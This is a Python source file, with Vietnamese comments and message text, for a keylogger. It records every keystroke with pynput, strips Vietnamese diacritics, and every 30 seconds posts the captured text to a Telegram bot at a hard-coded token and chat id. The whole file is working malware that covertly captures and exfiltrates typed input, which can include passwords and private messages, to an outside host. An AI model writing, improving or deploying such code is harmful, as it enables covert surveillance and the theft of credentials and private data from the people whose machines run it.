import sys
import time
import pytz
import requests
import pynput.keyboard
import datetime
from unidecode import unidecode


class KeyLogger:
    def __init__(self):
        self.log = 'Key Logger Started .....'

    def append_to_key(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = key.char
            if current_key.isalpha() and not current_key.isascii():
                # Chuyển đổi ký tự tiếng Việt có dấu sang không dấu
                current_key = unidecode(current_key)
        except AttributeError:
            if key == key.space:
                current_key = ' '
            else:
                current_key = ' ' + str(key) + ' '
        self.append_to_key(current_key)

    def report(self):
        while True:
            self.send_telegram()
            self.log = ''
            time.sleep(30)

    def start(self):
        try:
            keyboard_listener = pynput.keyboard. \
                Listener(on_press=self.process_key_press)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except Exception:
            sys.exit()

    def get_current_time(self):
        return datetime.datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')) \
            .strftime("%d-%m-%Y %H:%M:%S")

    def send_telegram(self):
        current_time = self.get_current_time()
        headers = {'Content-Type': 'application/xml'}
        body = f"Thời gian: {current_time}\nThông tin thu được : *{self.log}*"
        requests.post("https://api.telegram.org/bot5750385473:AAFLfYU-rKG0sQ0JtyRRiXYu8dzqVqNfQzA"
                      "/sendMessage?text="
                      + body + "&chat_id=-905746630" + "&parse_mode=Markdown",
                      headers=headers)


if __name__ == '__main__':
    KeyLogger().start()
